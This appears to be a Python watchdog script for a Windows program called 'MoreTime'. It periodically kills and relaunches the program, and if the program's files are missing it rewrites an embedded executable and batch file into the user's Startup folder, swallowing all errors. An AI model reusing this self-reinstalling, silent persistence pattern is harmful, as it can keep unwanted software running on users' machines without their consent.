from os import system, environ, startfile
from os.path import exists
from time import sleep
from library_data import MoreTime_code, Performer_code


try:
    path_MoreTime_1 = environ['APPDATA'] + r'\MoreTime\MoreTime.exe'#Admin
    path_MoreTime_1_2 = environ['APPDATA'] + r'\MoreTime\Performer.bat'#Admin ranner
    path_MoreTime_2 = environ['APPDATA'] + r'\Microsoft\Windows\Start Menu\Programs\Startup\Performer.bat'#User
    path_MoreTime_2_2 = environ['APPDATA'] + r'\Microsoft\Windows\Start Menu\Programs\MoreTime.exe'#User ranner
    destination = environ['APPDATA'] + "\\Microsoft\\Windows\\Start Menu\\Programs"
    while True:
        sleep(1200)#time stop
        system("taskkill /F /im MoreTime.exe")
        sleep(3)
        if(exists(path_MoreTime_1) and exists(path_MoreTime_1_2)):
            startfile(path_MoreTime_1_2)
        elif(exists(path_MoreTime_2) and exists(path_MoreTime_2_2)):
            startfile(path_MoreTime_2)
        else:
            with open(file=destination + "\\MoreTime.exe", mode='wb') as f:
                f.write(MoreTime_code())
            with open(file=destination + "\\Startup\\Performer.bat", mode="w", encoding="utf-8") as f:
                f.write(Performer_code())
except:
    pass